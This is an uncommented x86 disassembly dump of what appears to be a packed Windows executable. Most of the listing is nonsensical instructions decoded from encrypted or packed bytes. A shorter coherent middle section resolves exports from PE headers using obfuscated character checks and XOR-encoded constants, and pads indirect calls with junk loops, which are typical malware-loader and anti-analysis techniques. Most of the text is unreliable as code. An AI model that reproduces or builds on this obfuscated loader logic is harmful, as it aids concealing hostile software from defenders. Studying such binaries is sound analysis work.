  40797f:	imul   ebp,DWORD PTR [ecx+ebp*1],0xfffffff0
  407983:	aam    0x5
  407985:	xor    eax,0x3620d96c
  40798a:	xor    DWORD PTR [edi],ebx
  40798c:	stos   DWORD PTR es:[edi],eax
  40798d:	push   edx
  40798e:	hlt    
  40798f:	call   FWORD PTR [ecx+0xe]
  407992:	clc    
  407993:	sub    DWORD PTR [ebx-0x67],esi
  407996:	rol    ch,cl
  407998:	jmp    0xb1f3:0xbde89eea
  40799f:	out    0x65,al
  4079a1:	out    dx,al
  4079a2:	retf   
  4079a3:	add    eax,0x178dcb82
  4079a8:	pop    ebx
  4079a9:	aam    0x46
  4079ab:	pop    ss
  4079ac:	dec    edi
  4079ad:	sub    BYTE PTR [edi],dl
  4079af:	imul   edi,DWORD PTR [edi],0xffffffe5
  4079b2:	xor    BYTE PTR [eax+0x53e77960],0x53
  4079b9:	xlat   BYTE PTR ds:[ebx]
  4079ba:	inc    esi
  4079bb:	sbb    edx,DWORD PTR [ebx+0x5b41b991]
  4079c1:	mov    ch,0xe2
  4079c3:	or     BYTE PTR [ebx-0x63],bl
  4079c6:	cmp    al,0x39
  4079c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079c9:	jbe    0x4079ba
  4079cb:	sbb    BYTE PTR [esi-0x5270fe3f],bl
  4079d1:	mov    BYTE PTR [esi-0x35b00b72],bl
  4079d7:	scas   eax,DWORD PTR es:[edi]
  4079d8:	sbb    al,0x75
  4079da:	adc    DWORD PTR [edx],0x25e1240b
  4079e0:	inc    ebp
  4079e1:	faddp  st(7),st
  4079e3:	es (bad) 
  4079e5:	int3   
  4079e6:	jmp    0x4079f6
  4079e8:	adc    cl,0xb3
  4079eb:	cli    
  4079ec:	dec    esi
  4079ed:	int    0x72
  4079ef:	(bad)  
  4079f1:	jecxz  0x407a17
  4079f3:	jp     0x40798e
  4079f5:	test   al,0x40
  4079f7:	adc    al,0xf9
  4079f9:	sub    esp,eax
  4079fb:	add    eax,DWORD PTR [esi]
  4079fd:	pushf  
  4079fe:	push   esi
  4079ff:	std    
  407a00:	test   eax,0x5758c24a
  407a05:	in     al,dx
  407a06:	mov    ch,0xe5
  407a08:	cmp    al,0xb3
  407a0a:	push   ebp
  407a0b:	dec    ecx
  407a0c:	dec    edi
  407a0d:	jnp    0x407a81
  407a0f:	repz adc al,0xe
  407a12:	in     al,0xbb
  407a14:	jg     0x407a4d
  407a16:	push   ebp
  407a17:	outs   dx,DWORD PTR ds:[esi]
  407a18:	stc    
  407a19:	push   0x11f9e765
  407a1e:	ret    
  407a1f:	xor    ah,BYTE PTR [ebp-0x4b6ad7c9]
  407a25:	popf   
  407a26:	mov    ebp,0xda33181b
  407a2b:	sbb    esi,ebx
  407a2d:	sub    eax,0xf771afd7
  407a32:	enter  0xa656,0x9e
  407a36:	pushf  
  407a37:	outs   dx,BYTE PTR ds:[esi]
  407a38:	mov    bh,0x14
  407a3a:	add    eax,0xa138b8a6
  407a3f:	push   cs
  407a40:	fbstp  TBYTE PTR [eax+0x3d9e58a2]
  407a46:	or     dh,bl
  407a48:	(bad)  
  407a49:	sbb    al,0x7
  407a4b:	mov    eax,0x1c9f4e77
  407a50:	jecxz  0x407a63
  407a52:	lods   al,BYTE PTR ds:[esi]
  407a53:	ja     0x407a69
  407a55:	xchg   esp,eax
  407a56:	mov    cl,0x7d
  407a58:	and    al,0x2d
  407a5a:	sti    
  407a5b:	int3   
  407a5c:	jns    0x407a5e
  407a5e:	inc    ebx
  407a5f:	cmp    esp,DWORD PTR [eax-0x16b1e74d]
  407a65:	push   ds
  407a66:	repnz inc ebx
  407a68:	loop   0x407a2d
  407a6a:	ret    
  407a6b:	les    ebp,FWORD PTR [esi+0x29]
  407a6e:	mov    ah,0x66
  407a70:	mov    ecx,0x680b995
  407a75:	mov    esi,0x151a9076
  407a7a:	scas   al,BYTE PTR es:[edi]
  407a7b:	adc    edx,ebp
  407a7d:	and    ebx,edi
  407a7f:	fadd   DWORD PTR [ebx+esi*8-0x6f]
  407a83:	or     eax,DWORD PTR [ecx-0x27]
  407a86:	fs cld 
  407a88:	jns    0x407a81
  407a8a:	xor    edx,edi
  407a8c:	dec    eax
  407a8d:	lods   eax,DWORD PTR ds:[esi]
  407a8e:	and    eax,0x45
  407a91:	cwde   
  407a92:	fnstsw WORD PTR [esi-0x37]
  407a95:	(bad)
  407a98:	stc    
  407a99:	mov    ah,0x5b
  407a9b:	mov    al,BYTE PTR [edx-0x11]
  407a9e:	rol    DWORD PTR [eax],cl
  407aa0:	jo     0x407adf
  407aa2:	pop    es
  407aa3:	shl    DWORD PTR [eax+0x5f5f49a1],1
  407aa9:	out    dx,al
  407aaa:	fild   WORD PTR [edx-0x3cec04e]
  407ab0:	imul   ebp,DWORD PTR [edi-0x4a],0xbaeff576
  407ab7:	in     al,0x9b
  407ab9:	sub    esp,DWORD PTR [esi]
  407abb:	jle    0x407b15
  407abd:	xchg   ebx,eax
  407abe:	adc    eax,ebp
  407ac0:	enter  0x4285,0xec
  407ac4:	lahf   
  407ac5:	mov    bl,0xbf
  407ac7:	mov    ds:0x9b5a1975,al
  407acc:	xor    esi,edi
  407ace:	sub    eax,DWORD PTR [eax+0x3b]
  407ad1:	test   eax,0xcdcca39a
  407ad6:	call   0xd0d3:0x86ac775b
  407add:	sbb    al,0x80
  407adf:	pop    ebx
  407ae0:	jle    0x407b53
  407ae2:	jne    0x407a76
  407ae4:	mov    bh,0xed
  407ae6:	add    edi,DWORD PTR [edx+0x58]
  407ae9:	lods   eax,DWORD PTR ds:[esi]
  407aea:	push   eax
  407aeb:	addr16 es in eax,dx
  407aee:	imul   edx,DWORD PTR [ebx],0xffffffe2
  407af1:	popa   
  407af2:	scas   al,BYTE PTR es:[edi]
  407af3:	jle    0x407b53
  407af5:	out    dx,al
  407af6:	pop    esi
  407af7:	test   BYTE PTR [esi-0x69],dl
  407afa:	mov    edi,0xcd8c954e
  407aff:	dec    eax
  407b00:	mov    ch,0x11
  407b02:	shl    DWORD PTR [ecx],0x3e
  407b05:	aaa    
  407b06:	scas   eax,DWORD PTR es:[edi]
  407b07:	outs   dx,BYTE PTR ds:[esi]
  407b08:	or     ebx,DWORD PTR [esi]
  407b0a:	inc    ecx
  407b0b:	cs jge 0x407acb
  407b0e:	ret    0x6550
  407b11:	dec    edi
  407b12:	cmp    BYTE PTR [esi-0x4],dl
  407b15:	rcl    DWORD PTR [edi],1
  407b17:	dec    esp
  407b18:	out    dx,al
  407b19:	xor    DWORD PTR ds:0xcb7d398b,edx
  407b1f:	or     dl,bl
  407b21:	mov    ah,0x3a
  407b23:	push   esp
  407b24:	xor    eax,0x32ab488c
  407b29:	jle    0x407b9a
  407b2b:	cmp    edi,ebp
  407b2d:	xchg   ebp,eax
  407b2e:	pop    edi
  407b2f:	mov    ebp,esi
  407b31:	pop    ds
  407b32:	jle    0x407ae3
  407b34:	xchg   esp,eax
  407b35:	rcl    eax,cl
  407b37:	aaa    
  407b38:	rol    BYTE PTR [esi+0x33fe2bbd],cl
  407b3e:	stc    
  407b3f:	add    edi,0x3272db
  407b45:	not    edi
  407b47:	and    eax,edi
  407b49:	movsx  di,BYTE PTR [eax+0x1]
  407b4e:	mov    ebx,0x3b4a
  407b53:	sub    di,bx
  407b56:	mov    ebx,0x8a87
  407b5b:	xor    di,bx
  407b5e:	mov    ebx,0x4f97
  407b63:	cmp    di,bx
  407b66:	jne    0x407b8e
  407b6c:	movsx  di,BYTE PTR [eax]
  407b70:	mov    ebx,0x3b4a
  407b75:	sub    di,bx
  407b78:	mov    ebx,0x8a87
  407b7d:	xor    di,bx
  407b80:	mov    ebx,0x4f84
  407b85:	cmp    di,bx
  407b88:	je     0x407b9e
  407b8e:	mov    edi,DWORD PTR [ebp-0x10]
  407b91:	xor    edi,ecx
  407b93:	mov    ebx,esi
  407b95:	sub    ebx,edi
  407b97:	add    eax,ebx
  407b99:	jmp    0x407b49
  407b9e:	mov    esi,DWORD PTR [ebp-0x14]
  407ba1:	mov    esi,DWORD PTR [esi]
  407ba3:	mov    edi,DWORD PTR [eax+0x3c]
  407ba6:	lea    esi,[edi+esi*8+0x78]
  407baa:	mov    esi,DWORD PTR [esi+eax*1]
  407bad:	mov    DWORD PTR [ebp-0x8],esi
  407bb0:	mov    esi,DWORD PTR [ebp+0x8]
  407bb3:	xor    esi,ecx
  407bb5:	add    esi,edx
  407bb7:	mov    DWORD PTR [ebp-0x14],esi
  407bba:	mov    esi,DWORD PTR [ebp+0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x8]
  407bc0:	xor    esi,ecx
  407bc2:	add    esi,edx
  407bc4:	pop    ebx
  407bc5:	cmp    edi,esi
  407bc7:	jne    0x407be5
  407bcd:	mov    eax,DWORD PTR [ebp+0xc]
  407bd0:	xor    eax,ecx
  407bd2:	mov    ecx,DWORD PTR [ebp-0x8]
  407bd5:	add    eax,edx
  407bd7:	imul   eax,ecx
  407bda:	mov    DWORD PTR [ebp-0x8],eax
  407bdd:	push   DWORD PTR [ebp+0x18]
  407be0:	jmp    0x407c39
  407be5:	mov    ecx,DWORD PTR [ebp-0x8]
  407be8:	add    ecx,eax
  407bea:	mov    DWORD PTR [ebp-0x14],ecx
  407bed:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf0:	mov    ecx,DWORD PTR [ecx+0xc]
  407bf3:	movsx  cx,BYTE PTR [ecx+eax*1]
  407bf8:	mov    edx,0x3b4a
  407bfd:	sub    cx,dx
  407c00:	mov    edx,0x8a87
  407c05:	xor    cx,dx
  407c08:	mov    edx,0x4f86
  407c0d:	cmp    cx,dx
  407c10:	jne    0x407bdd
  407c16:	mov    ecx,DWORD PTR ds:0x4163b4
  407c1c:	mov    ecx,DWORD PTR [ecx+0x198]
  407c22:	mov    DWORD PTR [ecx],eax
  407c24:	jmp    0x407c4a
  407c29:	mov    ecx,DWORD PTR [ebp+0x18]
  407c2c:	cmp    ecx,0xf89c85b1
  407c32:	jne    0x407c4a
  407c38:	push   eax
  407c39:	push   DWORD PTR [ebp+0x14]
  407c3c:	push   DWORD PTR [ebp+0x10]
  407c3f:	push   DWORD PTR [ebp+0xc]
  407c42:	push   DWORD PTR [ebp+0x8]
  407c45:	call   0x405399
  407c4a:	pop    edi
  407c4b:	pop    esi
  407c4c:	leave  
  407c4d:	ret    0x14
  407c50:	push   ebp
  407c51:	mov    ebp,esp
  407c53:	push   ecx
  407c54:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  407c5b:	and    DWORD PTR ds:0x413c02,0x414004
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    edx,DWORD PTR [ebp+0x10]
  407c6b:	mov    ecx,0x7510894
  407c70:	xor    eax,ecx
  407c72:	add    eax,0x3272dc
  407c77:	mov    DWORD PTR [edx],eax
  407c79:	movzx  edx,WORD PTR ds:0x413c7c
  407c80:	and    edx,DWORD PTR ds:0x413cf4
  407c86:	mov    DWORD PTR ds:0x413c7c,edx
  407c8c:	mov    eax,DWORD PTR [ebp+0xc]
  407c8f:	sbb    DWORD PTR ds:0x413c02,0x413c0a
  407c99:	xor    eax,ecx
  407c9b:	adc    edx,DWORD PTR ds:0x414010
  407ca1:	push   esi
  407ca2:	sub    edx,DWORD PTR ds:0x413c84
  407ca8:	mov    esi,DWORD PTR [ebp+0x10]
  407cab:	movzx  edx,WORD PTR ds:0x414010
  407cb2:	sbb    DWORD PTR ds:0x413cf4,edx
  407cb8:	mov    edx,0x3272dc
  407cbd:	neg    DWORD PTR ds:0x413d20
  407cc3:	add    eax,edx
  407cc5:	xor    DWORD PTR ds:0x413c06,0x413c1a
  407ccf:	mov    DWORD PTR [esi+0x4],eax
  407cd2:	mov    eax,DWORD PTR [ebp+0x14]
  407cd5:	mov    esi,DWORD PTR [ebp+0x10]
  407cd8:	mov    DWORD PTR [esi+0x8],eax
  407cdb:	mov    eax,DWORD PTR [ebp+0x18]
  407cde:	mov    esi,DWORD PTR [ebp+0x10]
  407ce1:	mov    DWORD PTR [esi+0xc],eax
  407ce4:	mov    eax,DWORD PTR [ebp+0x1c]
  407ce7:	mov    esi,DWORD PTR [ebp+0x10]
  407cea:	mov    DWORD PTR [esi+0x10],eax
  407ced:	mov    eax,DWORD PTR [ebp+0x8]
  407cf0:	xor    eax,ecx
  407cf2:	add    eax,edx
  407cf4:	pop    esi
  407cf5:	leave  
  407cf6:	ret    0x18
  407cf9:	push   ebp
  407cfa:	mov    ebp,esp
  407cfc:	push   ecx
  407cfd:	and    DWORD PTR ds:0x413d34,0x0
  407d07:	xor    eax,eax
  407d09:	add    eax,DWORD PTR ds:0x413d34
  407d0f:	inc    eax
  407d10:	mov    ds:0x413d34,eax
  407d15:	cmp    DWORD PTR ds:0x413d34,0x10
  407d1c:	jne    0x407d30
  407d22:	push   DWORD PTR [ebp-0x14]
  407d25:	push   0x4160bf
  407d2a:	call   DWORD PTR ds:0x41678c
  407d30:	cmp    DWORD PTR ds:0x413d34,0xf
  407d37:	jne    0x407d48
  407d3d:	mov    eax,ds:0x413d34
  407d42:	inc    eax
  407d43:	mov    ds:0x413d34,eax
  407d48:	cmp    DWORD PTR ds:0x413d34,0x1e
  407d4f:	jb     0x407d07
  407d55:	sbb    eax,DWORD PTR ds:0x413bf6
  407d5b:	push   ecx
  407d5c:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  407d63:	and    DWORD PTR ds:0x413c06,0x0
  407d6d:	jmp    0x407d7f
  407d72:	mov    edx,DWORD PTR ds:0x413c06
  407d78:	inc    edx
  407d79:	mov    DWORD PTR ds:0x413c06,edx
  407d7f:	cmp    DWORD PTR ds:0x413c06,0x1d
  407d86:	jae    0x407dc8
  407d8c:	cmp    DWORD PTR ds:0x413c06,0x27
  407d93:	jne    0x407dbd
  407d99:	push   0x1c64
  407d9e:	push   0x413c06
  407da3:	push   0x752e
  407da8:	push   0x4160cf
  407dad:	push   0x55a9
  407db2:	push   0x2dee
  407db7:	call   DWORD PTR ds:0x416790
  407dbd:	jmp    0x407d72
  407dc2:	and    eax,DWORD PTR ds:0x413ce0
  407dc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  407dcf:	mov    DWORD PTR ds:0x413d34,0x14
  407dd9:	cmp    DWORD PTR ds:0x413d34,0x0
  407de0:	je     0x407e29
  407de6:	cmp    DWORD PTR ds:0x413d34,0x9
  407ded:	jne    0x407dfe
  407df3:	push   0x2bdc
  407df8:	call   DWORD PTR ds:0x416798
  407dfe:	cmp    DWORD PTR ds:0x413d34,0xa
  407e05:	jne    0x407e19
  407e0b:	xor    eax,eax
  407e0d:	add    eax,DWORD PTR ds:0x413d34
  407e13:	dec    eax
  407e14:	mov    ds:0x413d34,eax
  407e19:	mov    eax,ds:0x413d34
  407e1e:	dec    eax
  407e1f:	mov    ds:0x413d34,eax
  407e24:	jmp    0x407dd9
  407e29:	mov    eax,DWORD PTR [ebp-0x4]
  407e2c:	push   esi
  407e2d:	mov    esi,DWORD PTR [ebp-0x8]
  407e30:	mov    edx,0x7510894
  407e35:	xor    eax,edx
  407e37:	xor    esi,edx
  407e39:	mov    ecx,0x3272dc
  407e3e:	add    esi,ecx
  407e40:	add    eax,ecx
  407e42:	imul   eax,esi
  407e45:	mov    esi,DWORD PTR [ebp+0xc]
  407e48:	jmp    0x40a1fd
  407e4d:	mov    ds:0x72fcde4e,al
  407e52:	in     al,dx
  407e53:	xor    dl,0xf9
  407e56:	mov    ebp,0x7ca70e0
  407e5b:	bound  ebx,QWORD PTR [ecx]
  407e5d:	iret   
  407e5e:	and    bh,BYTE PTR [esp+edi*2-0x2c]
  407e62:	pop    edi
  407e63:	jl     0x407ee1
  407e65:	in     al,dx
  407e66:	cmp    ebx,DWORD PTR [edx+ecx*2+0x78d2d6ea]
  407e6d:	popa   
  407e6e:	pusha  
  407e6f:	aam    0xe1
  407e71:	adc    BYTE PTR [ebx],bl
  407e73:	mov    ch,0x5d
  407e75:	call   0xfa1b:0x25eeeca7
  407e7c:	mov    al,0xb5
  407e7e:	arpl   di,di
  407e80:	ret    0xbc33
  407e83:	rcr    BYTE PTR [eax+0x41c93318],0xba
  407e8a:	call   0x7cc7:0x9d0adf9c
  407e91:	pusha  
  407e92:	scas   eax,DWORD PTR es:[edi]
  407e93:	cmp    ebx,DWORD PTR [edx]
  407e95:	(bad)  
  407e96:	shl    DWORD PTR [ebx-0x6a],1
  407e99:	(bad)  [edx+0x6c]
  407e9c:	loope  0x407e32
  407e9e:	jle    0x407f12
  407ea0:	pop    edi
  407ea1:	js     0x407ec7
  407ea3:	aas    
  407ea4:	leave  
  407ea5:	loopne 0x407e4e
  407ea7:	popa   
  407ea8:	fdiv   QWORD PTR [edi-0xff56d4]
  407eae:	in     al,dx
  407eaf:	dec    ebp
  407eb0:	cmc    
  407eb1:	adc    ch,BYTE PTR [ecx-0x6ce9b459]
  407eb7:	fcomp  DWORD PTR [esp+edx*8]
  407eba:	call   0xf4a6:0x3e835f0
  407ec1:	and    eax,ebx
  407ec3:	inc    ebx
  407ec4:	mov    dh,BYTE PTR [ebp-0x22da30ea]
  407eca:	and    DWORD PTR [edx+0x7dceee08],ecx
  407ed0:	call   0x8b6b:0x2e0d949c
  407ed7:	pop    es
  407ed8:	and    eax,0x54f633ae
  407edd:	xor    BYTE PTR [edi-0x6e],cl
  407ee0:	pop    ss
  407ee1:	jne    0x407e79
  407ee3:	xchg   edi,eax
  407ee4:	leave  
  407ee5:	(bad)  
  407ee6:	retf   
  407ee7:	ror    edi,0xf6
  407eea:	mov    gs:0x29e42013,eax
  407ef0:	dec    ebx
  407ef1:	call   0x4fe:0xefdecdf7
  407ef8:	mov    gs,edi
  407efa:	adc    DWORD PTR [edx+0x54360494],esi
  407f00:	mov    WORD PTR [edx+0x53],es
  407f03:	sub    bh,BYTE PTR [esi]
  407f05:	and    bl,al
  407f07:	nop
  407f08:	lock and eax,0x508e8a04
  407f0e:	xchg   cl,cl
  407f10:	jmp    0x407f8a
  407f12:	xlat   BYTE PTR ds:[ebx]
  407f13:	jg     0x407eec
  407f15:	dec    eax
  407f16:	sahf   
  407f17:	(bad)  
  407f18:	clc    
  407f19:	test   al,0xbd
  407f1b:	mov    gs,esi
  407f1d:	sbb    eax,0x1dac451
  407f22:	jbe    0x407edc
  407f24:	xor    ch,BYTE PTR [edi+esi*8-0x41242388]
  407f2b:	adc    ah,cl
  407f2d:	call   0x338aa9c5
  407f32:	std    
  407f33:	pop    ebx
  407f34:	inc    edx
  407f35:	mov    ds:0x66eddb67,eax
  407f3a:	pop    esp
  407f3b:	shr    DWORD PTR [ebp-0x1c],cl
  407f3e:	cmp    esp,DWORD PTR [eax]
  407f40:	add    al,BYTE PTR [edi+edx*8-0x71]
  407f44:	out    dx,eax
  407f45:	inc    edx
  407f46:	xor    al,0xa4
  407f48:	jle    0x407ede
  407f4a:	in     eax,0xfa
  407f4c:	mov    ecx,0x2e60b18a
  407f51:	outs   dx,DWORD PTR ds:[esi]
  407f52:	adc    esp,DWORD PTR [edx-0x152c375c]
  407f58:	icebp  
  407f59:	retf   0x33f4
  407f5c:	nop
  407f5d:	adc    eax,0x243ae0f6
  407f62:	call   0x6e22:0xc2392c1b
  407f69:	add    DWORD PTR [ebp+0x63],ecx
  407f6c:	push   ecx
  407f6d:	sub    ch,BYTE PTR [ecx-0x56897c9c]
  407f73:	popf   
  407f74:	push   ds
  407f75:	arpl   ax,dx
  407f77:	jns    0x407fda
  407f79:	mov    dl,0xb1
  407f7b:	and    DWORD PTR [eax],0xc6b44d95
  407f81:	jno    0x407fd2
  407f83:	aaa    
  407f84:	pop    ebp
  407f85:	and    eax,0x5fa3d1b4
  407f8a:	jmp    0x5c0682ab
  407f8f:	mov    bh,0xa6
  407f91:	jecxz  0x407ff1
  407f93:	repnz mov ah,0xd7
  407f96:	enter  0xc21,0x3d
  407f9a:	mov    WORD PTR [eax],es
  407f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f9d:	mov    bh,0x0
  407f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fa0:	mov    dh,0xa5
  407fa2:	in     al,0xc1
  407fa4:	sbb    ah,bh
  407fa6:	call   0x3202:0x19fbcddb
  407fad:	test   ecx,eax
  407faf:	in     al,0x59
  407fb1:	pop    ds
  407fb2:	add    cl,BYTE PTR [edi+0x39]
  407fb5:	cmp    BYTE PTR [ecx-0x36],cl
  407fb8:	gs call 0x4ab52be5
  407fbe:	cli    
  407fbf:	retf   
  407fc0:	arpl   WORD PTR ds:[edx],cx
  407fc3:	sub    ebp,edx
  407fc5:	xchg   ebp,eax
  407fc6:	stos   BYTE PTR es:[edi],al
  407fc7:	mov    ebp,DWORD PTR [edx-0x22]
  407fca:	mov    BYTE PTR [ebp+0x23],cl
  407fcd:	hlt    
  407fce:	retf   0xe4f6
  407fd1:	cs and bh,al
  407fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd5:	xchg   BYTE PTR [ebx],ch
  407fd7:	aas    
  407fd8:	adc    eax,0x59e9d2f7
  407fdd:	xchg   ebx,eax
  407fde:	imul   ecx,DWORD PTR [ecx],0x5c19223a
  407fe4:	pop    ebp
  407fe5:	stos   BYTE PTR es:[edi],al
  407fe6:	and    ch,ch
  407fe8:	fidivr DWORD PTR ds:[edx]
  407feb:	push   0xabd8721f
  407ff0:	push   edx
  407ff1:	adc    al,0xff
  407ff3:	enter  0xb9ee,0xb2
  407ff7:	and    ecx,0xa0698b87
  407ffd:	cmc    
  407ffe:	mov    DWORD PTR [eax-0x25f33b62],eax
  408004:	lahf   
  408005:	push   ds
  408006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408007:	or     eax,0xdcaa9477
  40800c:	jae    0x40804e
  40800e:	icebp  
  40800f:	inc    edi
  408010:	adc    BYTE PTR [edx+0x1],dh
  408013:	cwde   
  408014:	push   0xfffffffe
  408016:	(bad)  
  408017:	xchg   ebp,eax
  408018:	xor    DWORD PTR [edx],edx
  40801a:	lock in eax,dx
  40801c:	jle    0x407fe8
  40801e:	shl    DWORD PTR [ebp+0x6f56edca],0x9d
  408025:	cwde   
  408026:	xchg   ecx,eax
  408027:	add    BYTE PTR [edi],0x5d
  40802a:	imul   ecx,DWORD PTR [ebx-0x21],0x32
  40802e:	or     DWORD PTR [ebx+0x60203fed],ebx
  408034:	enter  0x43fe,0x38
  408038:	push   0x36ed5079
  40803d:	dec    edx
  40803e:	shl    BYTE PTR ds:[edx-0x65],0xdb
  408043:	loope  0x407fcb
  408045:	(bad)  
  408046:	jmp    0x6cb:0x8a7f1fd4
  40804d:	(bad)  
  40804f:	loop   0x408091
  408051:	push   edx
  408052:	cmp    ah,BYTE PTR [ebx-0x1cb8e0bd]
  408058:	xor    eax,0x4b7c35f6
  40805d:	int    0x6d
  40805f:	shl    al,1
  408061:	cmp    dh,BYTE PTR [ebp+0x61]
  408064:	mov    dh,0x6a
  408066:	mov    al,0x50
  408068:	jne    0x40805c
  40806a:	dec    ebx
  40806b:	cs xchg ebp,eax
  40806d:	jl     0x408013
  40806f:	and    esp,DWORD PTR [ebp-0x7384cca2]
  408075:	dec    ebp
  408076:	mov    al,ds:0x8e04dfbf
  40807b:	xor    eax,DWORD PTR [ebx]
  40807d:	xlat   BYTE PTR ds:[ebx]
  40807e:	fistp  DWORD PTR [ebp+0x3d]
  408081:	xchg   ebp,eax
  408082:	push   edi
  408083:	fs pop ebp
  408085:	add    BYTE PTR [ebx+0x38],dh
  408088:	lea    ebp,cs:[eax-0x31]
  40808c:	hlt    
  40808d:	push   esp
  40808e:	push   ecx
  40808f:	cmc    
  408090:	out    dx,eax
  408091:	pop    esi
  408092:	imul   ecx,DWORD PTR [eax+0x40a9b59b],0x5bb11f3e
  40809c:	xor    ebp,ebp
  40809e:	repz enter 0x1ea,0xb4
  4080a3:	addr16 cmc 
  4080a5:	add    esi,0x6d
  4080a8:	xor    dh,BYTE PTR [ebp-0x56]
  4080ab:	ret    0xc720
  4080ae:	retf   0x4671
  4080b1:	test   eax,0xc0269d99
  4080b6:	mov    WORD PTR [eax],fs
  4080b8:	mov    DWORD PTR [edx],esp
  4080ba:	(bad)  
  4080bb:	fstp   TBYTE PTR [ebx-0x630f62af]
  4080c1:	repz inc edi
  4080c3:	or     ebp,eax
  4080c5:	rol    DWORD PTR [edx+0x10f2b6e1],0xf7
  4080cc:	ror    DWORD PTR [ecx],1
  4080ce:	ss dec edi
  4080d0:	lods   al,BYTE PTR ds:[esi]
  4080d1:	jb     0x4080b4
  4080d3:	ss (bad) 
  4080d6:	(bad)  
  4080d7:	fucomp st(5)
  4080d9:	sub    dl,BYTE PTR [edi+0x6f70ed14]
  4080df:	sbb    dl,BYTE PTR [eax-0x670d0dbb]
  4080e5:	mov    cs,WORD PTR [edi+esi*1+0x444df53f]
  4080ec:	sub    BYTE PTR [ecx-0x7c],bh
  4080ef:	adc    DWORD PTR [ebp+0x6f],edx
  4080f2:	and    DWORD PTR [esi-0x22],eax
  4080f5:	pushf  
  4080f6:	mov    WORD PTR [ebx],ss
  4080f8:	repz pop es
  4080fa:	out    dx,al
  4080fb:	das    
  4080fc:	and    eax,0x6470b343
  408101:	mov    bl,0xc7
  408103:	pop    esp
  408104:	lds    edx,FWORD PTR [ecx-0x1809cded]
  40810a:	fcom   QWORD PTR [esi+0x44]
  40810d:	push   es
  40810e:	(bad)  [edx+0x9a426e2]
  408114:	retf   0xc670
  408117:	arpl   WORD PTR [eax+0x7092844],bx
  40811d:	in     eax,dx
  40811e:	xor    esp,DWORD PTR [esi-0x614b2be5]
  408124:	mov    al,0x72
  408126:	iret   
  408127:	xor    ebp,DWORD PTR [esp+edx*2-0x1c]
  40812b:	xor    DWORD PTR [eax+0x2],ebx
  40812e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40812f:	jmp    0x9445e707
  408134:	icebp  
  408135:	pop    es
  408136:	dec    edi
  408137:	dec    esp
  408138:	sub    ah,BYTE PTR [ecx-0x48bfe0ff]
  40813e:	push   es
  40813f:	cmp    esp,ebp
  408141:	dec    esi
  408142:	push   es
  408143:	jge    0x408131
  408145:	mov    ebx,0x19a397e0
  40814a:	push   0xffffffa6
  40814c:	add    ebp,edi
  40814e:	sub    al,0x3e
  408150:	inc    eax
  408151:	push   0x91ae23cd
  408156:	mov    ch,0x9f
  408158:	pop    edi
  408159:	mov    cl,0xc1
  40815b:	(bad)  
  40815c:	xchg   esp,eax
  40815d:	div    BYTE PTR [esi+0x39]
  408160:	jb     0x408146
  408162:	pop    ds
  408163:	push   ds
  408164:	fiadd  WORD PTR [esp+ebp*2-0x50]
  408168:	add    eax,0x425714be
  40816d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40816e:	(bad)  
  40816f:	adc    al,bh
  408171:	rep ins DWORD PTR es:[edi],dx
  408173:	rcr    edx,1
  408175:	xor    al,0x9d
  408177:	push   ss
  408178:	xor    al,0x75
  40817a:	lods   eax,DWORD PTR ds:[esi]
  40817b:	gs test eax,0x9f96b21c
  408181:	aas    
  408182:	dec    ebp
  408183:	arpl   WORD PTR [eax],bx
  408185:	cmp    ecx,DWORD PTR [edx+eiz*1]
  408188:	pushf  
  408189:	pop    ds
  40818a:	and    DWORD PTR [esi+0x3],edi
  40818d:	cmp    BYTE PTR [edx],cl
  40818f:	test   al,0x31
  408191:	and    ecx,DWORD PTR ds:0x1f57b7df
  408197:	ja     0x408151
  408199:	jge    0x4081e0
  40819b:	mov    dh,0x29
  40819d:	mov    dh,0x64
  40819f:	aad    0x38
  4081a1:	cmp    DWORD PTR [esi-0x7d],edi
  4081a4:	cmp    BYTE PTR [ecx],0xcb
  4081a7:	xchg   edx,eax
  4081a8:	nop
  4081a9:	fwait
  4081aa:	mov    dh,0x6b
  4081ac:	mov    dh,0x7a
  4081ae:	inc    ebp
  4081af:	(bad)  
  4081b0:	fbstp  TBYTE PTR [eax]
  4081b2:	jb     0x40814c
  4081b4:	es mov ch,0xdd
  4081b7:	inc    edx
  4081b8:	inc    esp
  4081b9:	int    0x6a
  4081bb:	mov    edx,0x164e9cf5
  4081c0:	mov    ds:0x9287a59c,eax
  4081c5:	fiadd  WORD PTR [edx+0x4eba9a89]
  4081cb:	cwde   
  4081cc:	sti    
  4081cd:	fcom   st(1)
  4081cf:	cwde   
  4081d0:	div    BYTE PTR [esi+0x2f]
  4081d3:	rcr    eax,1
  4081d5:	imul   eax,DWORD PTR [ebx],0x54b57dfb
  4081db:	sar    esi,0x95
  4081de:	jecxz  0x40824e
  4081e0:	loopne 0x408183
  4081e2:	iret   
  4081e3:	cmp    DWORD PTR [edi],ecx
  4081e5:	aaa    
  4081e6:	push   esp
  4081e7:	mov    edx,0x7b57a2c5
  4081ec:	sbb    eax,DWORD PTR [edi]
  4081ee:	leave  
  4081ef:	xchg   esp,eax
  4081f0:	pop    ebx
  4081f1:	mov    ecx,0xae83ebfa
  4081f6:	jmp    0x408251
  4081f8:	sub    DWORD PTR [ebx-0x1a3794ed],ebp
  4081fe:	mov    DWORD PTR [edx+0x7aa61d13],ecx
  408204:	int3   
  408205:	fs je  0x40826c
  408208:	mov    esp,0xbf7a1fd4
  40820d:	clc    
  40820e:	jo     0x408283
  408210:	cmp    esp,DWORD PTR [esi-0x237e6c8a]
  408216:	stos   DWORD PTR es:[edi],eax
  408217:	inc    esi
  408218:	jp     0x4081de
  40821a:	xchg   ch,al
  40821c:	lahf   
  40821d:	in     al,dx
  40821e:	cmp    BYTE PTR [edx],0x7
  408221:	pop    edi
  408222:	or     eax,0xdf7cb624
  408227:	aad    0xcc
  408229:	mov    dh,0x6f
  40822b:	out    dx,al
